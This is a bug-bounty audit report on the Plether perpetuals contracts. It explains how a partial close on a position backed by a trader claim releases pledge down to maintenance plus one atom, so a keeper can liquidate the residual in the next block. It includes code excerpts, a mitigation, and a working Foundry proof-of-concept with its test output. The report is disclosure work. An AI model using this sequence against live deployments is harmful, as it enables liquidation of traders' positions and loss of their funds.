# \#100087 [SC-Critical] A partial close of a claim-backed position releases pledge down to "maintenance + 1 atom", so any keeper can liquidate the residual in the next block

**Submitted on Nov 16th 2026 at 08:04:57 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100087
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

A trader holds an open losing position and also holds a trader claim (a deferred payout from an earlier cash shortfall). When the trader closes part of the position, the planner pays the closed slice's loss **from the claim first**. The pledge allocated to that slice is now "unused", so the planner releases it to free settlement, and liquidation health does not count free settlement. The only limit on this release is `equity - maintenance - 1`. The residual is therefore left **one atom above the liquidation line**, however safe the account was before the close. In the PoC the account had a 50 bp price buffer (5x maintenance). After closing half of the position, the residual is liquidated in the next block at the same price.

### Vulnerability Details

**1. The closed slice's loss is paid from the claim before the pledge.**

```solidity
// CfdEnginePlanLib.sol:916-922
@> delta.pricePnlClaimConsumedAssets = snap.traderClaimBalanceForAccount < delta.priceLossAssets
       ? snap.traderClaimBalanceForAccount
       : delta.priceLossAssets;
   uint256 lossAfterClaimAssets = delta.priceLossAssets - delta.pricePnlClaimConsumedAssets;
   delta.pricePnlPledgeConsumedAssets =
       cs.marginToFreeAssets < lossAfterClaimAssets ? cs.marginToFreeAssets : lossAfterClaimAssets;
```

**2. The pro-rata pledge that the loss did not consume is released, and the only cap is maintenance + 1 atom.**

```solidity
// CfdEnginePlanLib.sol:937
@> delta.unlockMarginAssets = _maxPricePledgeUnlockPreservingTerminalCap(snap, delta, cs);

// CfdEnginePlanLib.sol:1166-1169  (_limitCloseReleaseByHealth)
@> uint256 headroom = uint256(risk.equityAssets) - risk.maintenanceMarginAssets - 1;
   if (delta.unlockMarginAssets > headroom) {
       delta.unlockMarginAssets = headroom;
   }
```

The withdraw path, which also moves value out of the margin bucket, requires `max(IM, MM/FAD)` (`CfdEngineSettlementSidecar.sol:326-331`). The partial-close release requires only `MM + 1`, with no room for carry, the next tick, or the liquidation confidence shift.

**3. Liquidation health counts only pledge plus claim, not the released free settlement.**

```solidity
// CfdEnginePlanLib.sol:1456-1463
delta.riskState = PositionRiskAccountingLib.buildExactPriceRiskState(
    pos, snap.positionEntryCostAssetAtoms, price, snap.capPrice,
@>  pos.margin + snap.traderClaimBalanceForAccount,
    maintMarginBps
);
```

**4. What pushes the residual over the line in the next block:**
- **Live:** about 1 second of carry at the same price, with zero Pyth confidence.
- **Oracle frozen (every weekend):** the voluntary close executes at the unshifted cached mark (`PletherOracle.sol:937-939`). A frozen liquidation of the same mark uses `confidence = price × 10 bp` (`PletherOracle.sol:742`) and shifts the price against the account by 25 % of that (`PletherOracle.sol:957-971`), i.e. 2.5 bp. The residual is liquidatable at the same mark for the whole weekend.

The trader cannot defend. The close is executed asynchronously by a keeper, so there is no atomic way to add margin before a liquidator acts.

**Control:** without a claim, the pro-rata release keeps the equity/notional ratio and the cap never binds. The claim-netting path is the root cause.

**Attack path**
1. Victim B holds an 85,337 USDG trader claim (created by a deferred profitable close on a thin pool, followed by the normal owner recovery `recapitalizePool` + `clearDegradedMode`).
2. B opens LONG 900,000 (990k USDG notional at 1.10) with 60k margin. The price moves against B, but B keeps a 50 bp buffer to the liquidation line. A keeper's liquidation attempt reverts.
3. B commits a close of half the position and a keeper executes it. The claim pays the closed loss (85,337 → 33,430 USDG). The pledge drops from 56,980 to 34,883 USDG, released down to the MM line.
4. Next block: any keeper calls `router.executeLiquidation(B, …)` at the same price (live) or the same frozen mark. The residual is liquidated.

### Impact Details

| Variant | Pre-close buffer | Residual notional | Trader harm beyond neutral mark-to-market | Keeper gain | Per $1M residual |
|---|---|---|---|---|---|
| Frozen | 47.5 bp beyond the 2.5 bp shift | 546,907 USDG | 683.63 USDG | 273.45 USDG | ~1,250 USDG |
| Live (conf 0) | 50 bp (5x MM) | 562,766 USDG | 562.76 USDG | ~281 USDG | ~1,000 USDG |

- The trader loses the whole residual equity (≈ MM) as the liquidation charge, plus the 2.5 bp shift in the frozen case. Half goes to the keeper and half to the LPs. There is no LP bad debt.
- Broken documented rule: "a partial close still requires a healthy residual position" (`ACCOUNTING_SPEC.md:1032`, `:1050`; `SECURITY.md:1290`). The residual passes this check only by one atom and fails it one block later.
- Precondition: the account holds a trader claim and an open losing position at the same time. No attacker privilege is needed, since any keeper can liquidate.

### Mitigation

In `_limitCloseReleaseByHealth`, cap the release so that the residual keeps `max(IM, MM/FAD)`, the same threshold as the withdraw guard (`CfdEngineSettlementSidecar.sol:326-331`). While the oracle is frozen, also add the maximum liquidation shift (`price × basketMaxConfidenceRatioBps × adverseConfidenceMultiplierBps / 1e8`). Alternatively, when the claim nets the closed loss, release only as much pledge as keeps the residual's equity ratio at or above its pre-close level.

### References

- `packages/perps/src/libraries/CfdEnginePlanLib.sol:916-922`: closed loss netted against the claim before the pledge
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:937`: release of the unused pro-rata pledge
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1137-1169`: `_limitCloseReleaseByHealth`, cap = `equity - MM - 1` (`:1166`)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1456-1463`: liquidation health uses pledge + claim only
- `packages/perps/src/CfdEngineSettlementSidecar.sol:326-331`: withdraw guard requires `max(IM, MM/FAD)`
- `packages/perps/src/PletherOracle.sol:742`, `:937-939`, `:957-971`: frozen close unshifted vs frozen liquidation shifted
- `packages/perps/ACCOUNTING_SPEC.md:1032`, `:1050`; `packages/perps/SECURITY.md:1290`: "a partial close requires a healthy residual position"

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/audit-fuzz/camp34-confidence/Camp34Report.t.sol`. It uses only the repo's own `BasePerpTest`, and only Pyth and USDG are mocked. Run:

```
forge test --root packages/perps --match-path test/audit-fuzz/camp34-confidence/Camp34Report.t.sol -vv
```

Two tests: (a) the oracle-frozen variant and (b) the live variant with zero confidence. Each test asserts that B is healthy before the close and that a keeper liquidates the residual in the next block, so PASS means the bug is reproduced.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Standalone PoC: uses only the repo fixture BasePerpTest; Pyth and USDG are the repo mocks.
import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A claim-backed LONG partially closes. The closed slice's loss is netted against the same-account trader
///         claim first, the "unused" pro-rata pledge is released to free settlement, and the release is capped only at
///         `equity - maintenance - 1` at the close price. The residual is left one atom above maintenance:
///         (a) oracle-frozen: the frozen liquidation of the same mark adds the max-confidence shift (2.5 bp) -> the
///             residual is liquidated in the very next block although the account was safe at that price before the
///             close;
///         (b) live, zero confidence: one second of carry is enough -> liquidated at the next tick, same price.
contract PartialCloseKnifeEdgePoC is BasePerpTest {

    address internal constant A = address(0xA11CE);
    address internal constant B = address(0xB0B); // victim: claim-backed trader
    address internal constant C = address(0xCA201);
    address internal constant KEEPER = address(0xBEEF0001);
    address internal constant LP = address(0x1B0001);

    uint256 internal currentPrice;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 80_000e6;
    }

    function setUp() public override {
        super.setUp();
        // release oracle confidence policy (manifest.json:180-181): cap 10 bp, adverse multiplier 2500
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.basketMaxConfidenceRatioBps = 10;
        cfg.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(cfg);
        vm.roll(vm.getBlockNumber() + 1);
        currentPrice = 1e8;
        _refresh(1e8);
        _fundTrader(A, 200_000e6);
        _fundTrader(B, 2_000_000e6);
        _fundTrader(C, 200_000e6);
        _fundJunior(LP, 40_000e6);
        _refresh(currentPrice);
    }

    // ------------------------------------------------------------------ helpers
    function _live(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        if (previous >= vm.getBlockTimestamp()) previous = vm.getBlockTimestamp() - 1;
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _tick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _refresh(uint256 price) internal returns (bool ok) {
        _tick();
        bytes[] memory d = _live(price);
        try router.updateMarkPrice(d) {
            currentPrice = price;
            ok = true;
        } catch {}
    }

    function _size(address a) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _executeHead() internal {
        uint64 head = router.nextExecuteId();
        if (head == 0) return;
        bytes[] memory data = _mockPythUpdateData(currentPrice);
        try router.executeOrder(head, data) {} catch {}
        if (engine.lastMarkPrice() != 0) currentPrice = engine.lastMarkPrice();
    }

    function _openQ(address a, CfdTypes.Side side, uint256 size, uint256 margin) internal returns (bool ok) {
        uint256 before = _size(a);
        vm.prank(a);
        try router.commitOrder(side, size, margin, 0, false) {
            _executeHead();
        } catch {
            return false;
        }
        ok = _size(a) != before;
    }

    function _closeQ(address a, CfdTypes.Side side) internal {
        uint256 size = _size(a);
        vm.prank(a);
        router.commitOrder(side, size, 0, 0, true);
        _executeHead();
    }

    function _longLiqThreshold(address a, uint256 lo, uint256 hi) internal view returns (uint256) {
        uint256 depth = pool.totalAssets();
        while (hi - lo > 1) {
            uint256 mid = (lo + hi) / 2;
            if (engineLens.isLiquidatableAt(a, mid, depth)) hi = mid;
            else lo = mid;
        }
        return hi;
    }

    function _traderVal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + engine.traderClaimBalanceAssets(a) + settlementToken.balanceOf(a);
    }

    function _nextFriday19() internal view returns (uint256 t) {
        uint256 day = vm.getBlockTimestamp() / 86_400;
        uint256 add = (5 + 7 - (day + 4) % 7) % 7;
        t = (day + add) * 86_400 + 19 hours;
        if (t <= vm.getBlockTimestamp()) t += 7 days;
    }

    /// @dev B obtains a legitimate trader claim on a thin pool (deferred profitable close), then the owner performs
    ///      the normal recovery (recapitalize so claims are funded, clear degraded mode).
    function _makeClaim() internal returns (uint256 claimB) {
        _openQ(A, CfdTypes.Side.LONG, 45_000e18, 9000e6);
        _openQ(B, CfdTypes.Side.SHORT, 45_000e18, 9000e6);
        _openQ(C, CfdTypes.Side.SHORT, 20_000e18, 4000e6);
        _openQ(A, CfdTypes.Side.LONG, 45_000e18, 9000e6);
        _openQ(B, CfdTypes.Side.SHORT, 45_000e18, 9000e6);
        _openQ(A, CfdTypes.Side.LONG, 20_000e18, 4000e6);
        _refresh(0.6e8);
        _closeQ(A, CfdTypes.Side.LONG);
        _refresh(1.4e8);
        _refresh(1.95e8);
        _closeQ(B, CfdTypes.Side.SHORT);
        _closeQ(C, CfdTypes.Side.SHORT);
        claimB = engine.traderClaimBalanceAssets(B);
        uint256 T = engine.totalTraderClaimBalanceAssets();
        uint256 ta = pool.totalAssets();
        uint256 recap = (T > ta ? T - ta : 0) + 3_000_000e6;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        engine.clearDegradedMode();
    }

    // ------------------------------------------------------------------ (a) frozen window
    function test_FrozenPartialCloseMakesResidualLiquidatable() public {
        uint256 claimB = _makeClaim();
        assertGt(claimB, 50_000e6, "B holds a trader claim");

        uint256 fri = _nextFriday19();
        vm.warp(fri);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(_refresh(1.1e8), "refresh");
        // B: 900k LONG (990k USDG notional) with 60k margin, backed also by its claim; price drifts against it
        assertTrue(_openQ(B, CfdTypes.Side.LONG, 900_000e18, 60_000e6), "open");
        _refresh(1.15e8);
        _refresh(1.2e8);

        // Saturday frozen-margin (3%) liquidation threshold for B, then place the last live mark 50 bp below it:
        // B has 47.5 bp of buffer beyond the 2.5 bp frozen liquidation shift.
        uint256 sat = fri + 17 hours;
        uint256 snap = vm.snapshotState();
        vm.warp(sat);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 pStar = _longLiqThreshold(B, 1.1e8, 1.6e8);
        vm.revertToState(snap);
        uint256 p1 = pStar - pStar * 500 / 100_000;
        vm.warp(fri + 80 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(_refresh(p1), "last live mark");

        vm.warp(sat);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen() && engine.isFadWindow(), "frozen + FAD");
        uint256 shift = p1 * 10 / 10_000 * 2500 / 10_000; // _frozenBasket: conf = price * 10 bp; x 25 %
        assertFalse(engineLens.isLiquidatableAt(B, p1 + shift, pool.totalAssets()), "safe at frozen liq price");

        // keeper cannot liquidate before the close
        snap = vm.snapshotState();
        _tick();
        vm.prank(KEEPER);
        bool preOk;
        try router.executeLiquidation(B, new bytes[](0)) {
            preOk = true;
        } catch {}
        vm.revertToState(snap);
        assertFalse(preOk, "pre-close liquidation reverts");

        // B voluntarily closes half while frozen (executes at the unshifted cached mark)
        uint256 closeSize = _size(B) / 2 / 1e20 * 1e20;
        uint256 marginBefore = clearinghouse.pnlPledgeAssets(B);
        vm.prank(B);
        uint64 oid = router.commitOrder(CfdTypes.Side.LONG, closeSize, 0, 0, true);
        _tick();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory er = router.executeOrder(oid, new bytes[](0));
        assertEq(uint8(er.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "close executed");
        console2.log("pledge before / after close", marginBefore, clearinghouse.pnlPledgeAssets(B));
        console2.log("claim before / after close", claimB, engine.traderClaimBalanceAssets(B));
        uint256 remNotional = _size(B) / 1e18 * p1 / 1e2;

        // next block: any keeper liquidates the residual at the same frozen mark
        uint256 v0 = _traderVal(B);
        uint256 k0 = clearinghouse.balanceAssets(KEEPER) + settlementToken.balanceOf(KEEPER);
        int256 pnlAtNeutral = -int256(_size(B) / 1e18 * (p1 - 1.1e8) / 1e2); // LONG entry 1.10
        _tick();
        vm.prank(KEEPER);
        router.executeLiquidation(B, new bytes[](0));
        assertEq(_size(B), 0, "BUG: residual liquidated right after a voluntary partial close");
        uint256 lost = v0 - _traderVal(B);
        uint256 harm = lost - uint256(-pnlAtNeutral); // loss beyond the neutral mark-to-market
        uint256 keeperGain = clearinghouse.balanceAssets(KEEPER) + settlementToken.balanceOf(KEEPER) - k0;
        console2.log("residual notional (USDG atoms)", remNotional);
        console2.log("victim harm beyond neutral MTM (atoms)", harm);
        console2.log("keeper gain (atoms)", keeperGain);
        console2.log("harm per $1M residual notional (USDG atoms)", harm * 1e12 / remNotional);
    }

    // ------------------------------------------------------------------ (b) live, zero confidence
    function test_LivePartialCloseLeavesResidualOneAtomAboveMaintenance() public {
        uint256 claimB = _makeClaim();
        assertGt(claimB, 50_000e6, "B holds a trader claim");
        uint256 wd = (vm.getBlockTimestamp() / 1 days + 1) * 1 days + 14 hours;
        while (true) {
            vm.warp(wd);
            if (!engine.isFadWindow() && !engine.isOracleFrozen()) break;
            wd += 1 days;
        }
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(_refresh(1.1e8), "refresh");
        assertTrue(_openQ(B, CfdTypes.Side.LONG, 900_000e18, 60_000e6), "open");
        _refresh(1.15e8);
        uint256 pStar = _longLiqThreshold(B, 1.1e8, 1.6e8);
        uint256 p1 = pStar - pStar * 500 / 100_000; // 50 bp of price buffer (5x the 10 bp maintenance margin)
        assertTrue(_refresh(p1), "mark");
        assertFalse(engineLens.isLiquidatableAt(B, p1, pool.totalAssets()), "pre-close healthy");

        uint256 closeSize = _size(B) / 2 / 1e20 * 1e20;
        vm.prank(B);
        uint64 oid = router.commitOrder(CfdTypes.Side.LONG, closeSize, 0, 0, true);
        currentPrice = p1;
        bytes[] memory d = _mockPythUpdateData(p1); // conf 0: no adverse shift at all
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory er = router.executeOrder(oid, d);
        assertEq(uint8(er.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "close executed");

        uint256 v0 = _traderVal(B);
        int256 pnlAtNeutral = -int256(_size(B) / 1e18 * (p1 - 1.1e8) / 1e2);
        uint256 remNotional = _size(B) / 1e18 * p1 / 1e2;
        console2.log("live pre-close buffer: liquidation threshold vs mark (8dp)", pStar, p1);
        _tick(); // one second later, same price, zero confidence
        bytes[] memory l = _live(p1);
        vm.prank(KEEPER);
        router.executeLiquidation(B, l);
        assertEq(_size(B), 0, "BUG: residual liquidated one second after the partial close at an unchanged price");
        uint256 harm = v0 - _traderVal(B) - uint256(-pnlAtNeutral);
        console2.log("live residual notional / harm (atoms)", remNotional, harm);
        console2.log("live harm per $1M residual notional (atoms)", harm * 1e12 / remNotional);
    }

}
```

Result (actually run, `forge test --root packages/perps --match-path test/audit-fuzz/camp34-confidence/Camp34Report.t.sol -vv`, commit `a82d4fef`):

```
Ran 2 tests for test/audit-fuzz/camp34-confidence/Camp34Report.t.sol:PartialCloseKnifeEdgePoC
[PASS] test_FrozenPartialCloseMakesResidualLiquidatable() (gas: 24412318)
Logs:
  pledge before / after close 56980500000 34883702797
  claim before / after close 85337645244 33430577244
  residual notional (USDG atoms) 546907068000
  victim harm beyond neutral MTM (atoms) 683630677
  keeper gain (atoms) 273453534
  harm per $1M residual notional (USDG atoms) 1249994225

[PASS] test_LivePartialCloseLeavesResidualOneAtomAboveMaintenance() (gas: 24345735)
Logs:
  live pre-close buffer: liquidation threshold vs mark (8dp) 125687440 125059003
  live residual notional / harm (atoms) 562765513500 562761110
  live harm per $1M residual notional (atoms) 999992175

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

